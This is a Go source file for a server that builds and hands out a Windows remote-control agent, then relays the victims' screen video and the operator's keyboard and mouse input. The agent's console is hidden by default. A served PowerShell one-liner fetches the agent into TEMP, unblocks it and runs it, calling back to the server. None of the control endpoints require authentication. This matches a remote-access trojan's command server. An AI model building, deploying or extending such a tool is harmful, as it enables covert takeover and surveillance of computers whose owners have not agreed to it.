package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type AgentSession struct {
	ID        string          `json:"id"`
	Hostname  string          `json:"hostname"`
	OS        string          `json:"os"`
	Connected time.Time       `json:"connected"`
	Displays  []interface{}   `json:"displays"`
	Conn      *websocket.Conn `json:"-"`
	mu        sync.Mutex
}

var (
	agents   = make(map[string]*AgentSession)
	agentsMu sync.RWMutex

	buildMu sync.Mutex

	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool {
			return true // Accepter toutes les origines pour le dashboard
		},
	}
)

func findAgentSrc(specifiedDir string) string {
	candidates := []string{
		specifiedDir,
		"./agent",
		"../agent",
	}
	if execPath, err := os.Executable(); err == nil {
		execDir := filepath.Dir(execPath)
		candidates = append(candidates,
			filepath.Join(execDir, "agent"),
			filepath.Join(execDir, "../agent"),
			filepath.Join(execDir, "../../agent"),
		)
	}
	for _, c := range candidates {
		if c == "" {
			continue
		}
		if fi, err := os.Stat(filepath.Join(c, "main.go")); err == nil && !fi.IsDir() {
			if abs, err := filepath.Abs(c); err == nil {
				return abs
			}
			return c
		}
	}
	return ""
}

func getCompilerInfo() (bool, string) {
	goPath, err := exec.LookPath("go")
	if err != nil {
		return false, "Compilateur Go ('go') introuvable dans PATH"
	}
	out, err := exec.Command(goPath, "version").CombinedOutput()
	if err != nil {
		return true, "Go présent"
	}
	return true, strings.TrimSpace(string(out))
}

func main() {
	port := flag.Int("port", 8080, "Port d'écoute du serveur")
	binDir := flag.String("bin-dir", "./bin", "Dossier contenant l'agent compilé")
	agentSrc := flag.String("agent-src", "./agent", "Dossier contenant les sources Go de l'agent")
	flag.Parse()

	_ = os.MkdirAll(*binDir, 0755)

	// 1. Route pour télécharger l'agent via cmd / powershell / curl / certutil
	http.HandleFunc("/dl/agent.exe", func(w http.ResponseWriter, r *http.Request) {
		agentPath := filepath.Join(*binDir, "agent.exe")
		if _, err := os.Stat(agentPath); os.IsNotExist(err) {
			http.Error(w, "Agent non encore compilé sur le serveur (agent.exe introuvable)", http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Disposition", "attachment; filename=agent.exe")
		w.Header().Set("Content-Type", "application/octet-stream")
		http.ServeFile(w, r, agentPath)
	})

	// 1.bis Script PowerShell one-liner à télécharger ou exécuter
	http.HandleFunc("/dl/run.ps1", func(w http.ResponseWriter, r *http.Request) {
		host := r.URL.Query().Get("server")
		if host == "" {
			host = r.Host
		}
		proto := "http"
		cleanHost := strings.Split(host, ":")[0]
		if r.TLS != nil || r.Header.Get("X-Forwarded-Proto") == "https" || strings.Contains(r.Header.Get("CF-Visitor"), "https") {
			proto = "https"
		} else if strings.Contains(cleanHost, ".") &&
			!strings.HasPrefix(cleanHost, "127.") &&
			!strings.HasPrefix(cleanHost, "192.168.") &&
			!strings.HasPrefix(cleanHost, "10.") &&
			!strings.HasPrefix(cleanHost, "172.") &&
			cleanHost != "localhost" {
			proto = "https"
		}
		script := fmt.Sprintf(`$url = "%s://%s/dl/agent.exe"
$out = "$env:TEMP\agent.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $out)
Unblock-File $out -ErrorAction SilentlyContinue
Start-Process -FilePath $out -ArgumentList "-server %s" -NoNewWindow
`, proto, host, host)
		w.Header().Set("Content-Type", "text/plain")
		w.Write([]byte(script))
	})

	// 2. API pour lister les agents connectés
	http.HandleFunc("/api/agents", func(w http.ResponseWriter, r *http.Request) {
		agentsMu.RLock()
		defer agentsMu.RUnlock()

		list := make([]*AgentSession, 0, len(agents))
		for _, a := range agents {
			list = append(list, a)
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(list)
	})

	// 2.bis API d'information sur le compilateur et l'agent
	http.HandleFunc("/api/compiler-info", func(w http.ResponseWriter, r *http.Request) {
		goOk, goVer := getCompilerInfo()
		srcDir := findAgentSrc(*agentSrc)
		agentPath := filepath.Join(*binDir, "agent.exe")
		fi, statErr := os.Stat(agentPath)

		resp := map[string]interface{}{
			"go_installed":    goOk,
			"go_version":      goVer,
			"agent_src_found": srcDir != "",
			"agent_src_dir":   srcDir,
			"agent_exists":    statErr == nil,
			"current_host":    r.Host,
		}
		if statErr == nil {
			resp["agent_size"] = fi.Size()
			resp["agent_modified"] = fi.ModTime().Format("2006-01-02 15:04:05")
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	})

	// 2.ter API pour compiler une version personnalisée de l'agent
	http.HandleFunc("/api/compile", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Méthode non autorisée (POST requis)", http.StatusMethodNotAllowed)
			return
		}

		type CompileReq struct {
			Server      string `json:"server"`
			HideConsole *bool  `json:"hide_console"`
			Arch        string `json:"arch"`
		}

		var req CompileReq
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			// Si le body n'est pas du JSON, tester si passé en query
			req.Server = r.URL.Query().Get("server")
		}

		serverHost := strings.TrimSpace(req.Server)
		if serverHost == "" {
			serverHost = r.Host
		}

		// Nettoyage de l'adresse saisie
		serverHost = strings.TrimPrefix(serverHost, "https://")
		serverHost = strings.TrimPrefix(serverHost, "http://")
		serverHost = strings.TrimRight(serverHost, "/")
		serverHost = strings.TrimSpace(serverHost)

		if serverHost == "" {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": false,
				"error":   "Nom de domaine ou adresse du serveur invalide/vide.",
			})
			return
		}

		arch := req.Arch
		if arch == "" {
			arch = "amd64"
		}

		hideConsole := true
		if req.HideConsole != nil {
			hideConsole = *req.HideConsole
		}

		buildMu.Lock()
		defer buildMu.Unlock()

		goPath, err := exec.LookPath("go")
		if err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": false,
				"error":   "Compilateur Go ('go') introuvable dans le PATH du serveur.",
			})
			return
		}

		realSrc := findAgentSrc(*agentSrc)
		if realSrc == "" {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": false,
				"error":   "Dossier source de l'agent ('agent/main.go') introuvable sur le serveur.",
			})
			return
		}

		_ = os.MkdirAll(*binDir, 0755)
		tmpExe := filepath.Join(*binDir, fmt.Sprintf("agent_build_%d.exe", time.Now().UnixNano()))
		targetExe := filepath.Join(*binDir, "agent.exe")

		ldflags := fmt.Sprintf("-X 'main.defaultServer=%s' -s -w", serverHost)
		if hideConsole {
			ldflags += " -H=windowsgui"
		}

		homeDir, _ := os.UserHomeDir()
		if homeDir == "" {
			homeDir = "/root"
		}

		buildCmd := exec.Command(goPath, "build", "-trimpath", "-ldflags", ldflags, "-o", tmpExe, ".")
		buildCmd.Dir = realSrc
		buildCmd.Env = append(os.Environ(),
			"CGO_ENABLED=0",
			"GOOS=windows",
			fmt.Sprintf("GOARCH=%s", arch),
			"HOME="+homeDir,
			"GOPATH="+filepath.Join(homeDir, "go"),
			"GOCACHE="+filepath.Join(homeDir, ".cache", "go-build"),
			"GOMODCACHE="+filepath.Join(homeDir, "go", "pkg", "mod"),
		)

		log.Printf("[*] Compilation agent en cours pour '%s' (arch: %s, gui: %v)...", serverHost, arch, hideConsole)
		start := time.Now()
		output, err := buildCmd.CombinedOutput()
		elapsed := time.Since(start)

		if err != nil {
			_ = os.Remove(tmpExe)
			log.Printf("[-] Échec compilation: %v\n%s", err, string(output))
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": false,
				"error":   fmt.Sprintf("Erreur compilation: %v", err),
				"output":  string(output),
			})
			return
		}

		// Signature si script sign_agent.ps1 disponible et sur Windows
		if runtime.GOOS == "windows" {
			signScript := "sign_agent.ps1"
			if _, statErr := os.Stat(signScript); statErr == nil {
				_ = exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-File", signScript).Run()
			}
		}

		// Remplacement sécurisé du fichier agent.exe
		_ = os.Remove(targetExe)
		if err := os.Rename(tmpExe, targetExe); err != nil {
			// Repli sur copie binaire si rename entre volumes différents ou verrouillé
			input, rErr := os.ReadFile(tmpExe)
			if rErr == nil {
				_ = os.WriteFile(targetExe, input, 0755)
				_ = os.Remove(tmpExe)
			} else {
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusInternalServerError)
				json.NewEncoder(w).Encode(map[string]interface{}{
					"success": false,
					"error":   fmt.Sprintf("Erreur remplacement agent.exe: %v", rErr),
				})
				return
			}
		}

		fi, statErr := os.Stat(targetExe)
		var size int64 = 0
		if statErr == nil {
			size = fi.Size()
		}

		log.Printf("[+] Agent compilé avec succès en %v (%d octets) pour '%s'", elapsed.Round(time.Millisecond), size, serverHost)

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success":      true,
			"server":       serverHost,
			"size":         size,
			"duration_ms":  elapsed.Milliseconds(),
			"download_url": fmt.Sprintf("/dl/agent.exe?v=%d", time.Now().Unix()),
			"build_time":   time.Now().Format("2006-01-02 15:04:05"),
			"message":      fmt.Sprintf("Agent compilé avec succès pour '%s' (taille: %.2f MB)", serverHost, float64(size)/(1024*1024)),
		})
	})

	// 3. WebSocket pour l'Agent (flux vidéo + réception inputs)
	http.HandleFunc("/ws/agent", handleAgentWS)

	// 4. WebSocket pour le Dashboard Admin (réception flux vidéo + envoi inputs)
	http.HandleFunc("/ws/admin", handleAdminWS)

	// 5. Interface Web Dashboard
	http.Handle("/", http.FileServer(http.Dir("./web")))

	addr := fmt.Sprintf(":%d", *port)
	log.Printf("======================================================")
	log.Printf("  Serveur ak-ses en écoute sur http://0.0.0.0%s", addr)
	log.Printf("  Dashboard Admin : http://localhost:%d", *port)
	log.Printf("  Téléchargement Agent : http://localhost:%d/dl/agent.exe", *port)
	log.Printf("======================================================")

	if err := http.ListenAndServe(addr, nil); err != nil {
		log.Fatalf("[-] Erreur serveur: %v", err)
	}
}

// WebSocket Agent
func handleAgentWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[-] Upgrade error (agent): %v", err)
		return
	}
	defer conn.Close()

	agentID := r.URL.Query().Get("id")
	if agentID == "" {
		agentID = fmt.Sprintf("agent-%d", time.Now().Unix())
	}
	hostname := r.URL.Query().Get("hostname")
	osName := r.URL.Query().Get("os")

	session := &AgentSession{
		ID:        agentID,
		Hostname:  hostname,
		OS:        osName,
		Connected: time.Now(),
		Conn:      conn,
	}

	agentsMu.Lock()
	agents[agentID] = session
	agentsMu.Unlock()

	log.Printf("[+] Machine connectée: %s (%s, %s)", agentID, hostname, osName)

	defer func() {
		agentsMu.Lock()
		delete(agents, agentID)
		agentsMu.Unlock()
		log.Printf("[-] Machine déconnectée: %s", agentID)
		notifyAgentDisconnect(agentID)
	}()

	// Détecte une déconnexion brutale (crash/wifi coupé) sous 6s
	conn.SetReadDeadline(time.Now().Add(6 * time.Second))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(6 * time.Second))
		return nil
	})

	// L'agent envoie des frames binaires ou des messages texte (displays info)
	for {
		conn.SetReadDeadline(time.Now().Add(6 * time.Second))
		msgType, data, err := conn.ReadMessage()
		if err != nil {
			break
		}

		if msgType == websocket.BinaryMessage {
			// Diffuser l'image aux admins qui contrôlent cette machine
			broadcastFrame(agentID, data)
		} else if msgType == websocket.TextMessage {
			// Traitement d'informations de l'agent (ex: liste d'écrans)
			var msg map[string]interface{}
			if err := json.Unmarshal(data, &msg); err == nil {
				if msg["type"] == "displays" {
					if disps, ok := msg["displays"].([]interface{}); ok {
						agentsMu.Lock()
						if a, exists := agents[agentID]; exists {
							a.Displays = disps
						}
						agentsMu.Unlock()
						broadcastMessage(agentID, data)
					}
				}
			}
		}
	}
}

// Gestion des sessions Admin
type AdminViewer struct {
	agentID string
	conn    *websocket.Conn
}

var (
	viewers   = make(map[*websocket.Conn]*AdminViewer)
	viewersMu sync.RWMutex
)

func broadcastFrame(agentID string, frame []byte) {
	viewersMu.RLock()
	defer viewersMu.RUnlock()

	for conn, viewer := range viewers {
		if viewer.agentID == agentID {
			conn.WriteMessage(websocket.BinaryMessage, frame)
		}
	}
}

func broadcastMessage(agentID string, msg []byte) {
	viewersMu.RLock()
	defer viewersMu.RUnlock()

	for conn, viewer := range viewers {
		if viewer.agentID == agentID {
			conn.WriteMessage(websocket.TextMessage, msg)
		}
	}
}

func notifyAgentDisconnect(agentID string) {
	viewersMu.Lock()
	defer viewersMu.Unlock()

	msg, _ := json.Marshal(map[string]interface{}{
		"type":     "target_disconnected",
		"agent_id": agentID,
	})

	for conn, viewer := range viewers {
		if viewer.agentID == agentID {
			_ = conn.WriteMessage(websocket.TextMessage, msg)
			_ = conn.Close()
			delete(viewers, conn)
		}
	}
}

func handleAdminWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[-] Upgrade error (admin): %v", err)
		return
	}
	defer conn.Close()

	agentID := r.URL.Query().Get("id")
	viewer := &AdminViewer{
		agentID: agentID,
		conn:    conn,
	}

	viewersMu.Lock()
	viewers[conn] = viewer
	viewersMu.Unlock()

	log.Printf("[+] Admin a ouvert le contrôle de l'agent: %s", agentID)

	defer func() {
		viewersMu.Lock()
		delete(viewers, conn)
		viewersMu.Unlock()
		log.Printf("[-] Admin a fermé le contrôle de l'agent: %s", agentID)
	}()

	// L'admin envoie des commandes (clavier/souris)
	for {
		msgType, message, err := conn.ReadMessage()
		if err != nil {
			break
		}

		if msgType == websocket.TextMessage {
			agentsMu.RLock()
			agent, exists := agents[agentID]
			agentsMu.RUnlock()

			if exists && agent.Conn != nil {
				agent.mu.Lock()
				agent.Conn.WriteMessage(websocket.TextMessage, message)
				agent.mu.Unlock()
			}
		}
	}
}
